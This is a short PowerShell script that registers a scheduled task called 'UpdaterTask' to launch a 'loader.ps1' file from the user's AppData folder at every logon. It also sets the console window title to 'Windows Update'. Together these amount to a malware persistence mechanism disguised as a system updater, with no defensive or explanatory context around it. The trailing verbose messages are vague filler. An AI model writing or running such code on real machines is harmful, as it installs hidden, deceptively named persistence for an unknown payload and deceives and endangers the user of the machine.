
$TaskName = "UpdaterTask"
$ScriptPath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
$TaskState = Get-ScheduledTask -TaskName $TaskName
Write-Verbose ("Task state: " + $TaskState.State)

$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Validating result"
